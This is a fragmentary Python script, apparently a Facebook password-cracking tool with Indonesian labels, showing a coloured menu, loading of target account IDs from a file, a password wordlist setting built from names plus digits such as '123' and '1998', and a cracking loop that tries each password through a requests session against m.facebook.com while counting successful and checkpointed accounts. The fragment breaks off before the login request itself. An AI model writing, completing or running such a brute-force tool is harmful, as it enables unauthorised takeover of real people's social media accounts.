...
def menu():
	...
	banner()
	#print(f'{Y}[MENU]{Y}')
	print(f'\x1b[38;5;22m[ 1 ] CRACK BA FILE	')
...
def crack_file():
            try:
                fileX = input (f'\x1b[38;5;52mFile bnusa ')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\x1b[1;33m[ 1 ] RANDOM')
	V = (f'\x1b[38;5;166m[HALLBZHERA')
	hu = input(f'{V}: ')
	if hu in ['1','01']:
		for bacot in id:
		...
		exit()
	print(f'\x1b[38;5;5m[ 1 ] METHOD $ M.FACEBOOK.com')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
   print(f'\x1b[1;32m[ 1 ] PASSWORD 123 +1998')
...
def crackmobile_ARA(idf,pwv,nmf):
	...
	fff = '%'
	sys.stdout.write(f'\r{a19}[{a10}%sRaWa{a7}]-{a13}[%s/%s]🖤{a18}[OK:%s]{a22}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
